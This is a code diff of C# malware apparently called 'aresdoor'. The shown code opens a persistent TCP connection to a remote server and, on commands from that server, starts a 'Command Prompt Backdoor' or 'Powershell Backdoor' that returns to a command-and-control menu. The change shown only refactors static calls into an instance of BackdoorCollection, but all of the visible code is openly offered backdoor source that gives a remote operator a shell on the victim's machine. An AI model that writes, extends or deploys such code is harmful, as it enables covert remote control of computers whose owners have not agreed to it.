@@ -232,7 +232,10 @@ namespace aresdoor
                         // Define a couple of variables that set our connection target
                         TcpClient client = new System.Net.Sockets.TcpClient(server, port);
                         NetworkStream stream = client.GetStream();
+
+                        // Custom class/method instances
                         NetworkCommunication nc = new NetworkCommunication();
+                        BackdoorCollection bc = new BackdoorCollection();
 
                         // Write in loop for a persistant connection
                         while (true)
@@ -265,13 +268,13 @@ namespace aresdoor
                             if (responseFromServer == "1")
                             {
                                 nc.dataTravelTO(stream, "You've selected 'Command Prompt Backdoor'\n");
-                                while (BackdoorCollection.CommandPromptBackdoor(stream)) { }
+                                while (bc.CommandPromptBackdoor(stream)) { }
                                 goto candcmenu;                                
                             }
                             else if (responseFromServer == "2")
                             {
                                 nc.dataTravelTO(stream, "You've selected 'Powershell Backdoor'\n");
-                                while (BackdoorCollection.PowershellBackdoor(stream)) { }
+                                while (bc.PowershellBackdoor(stream)) { }
                                 goto candcmenu;
                             }
                             else if (responseFromServer == "3" || responseFromServer == "exit")
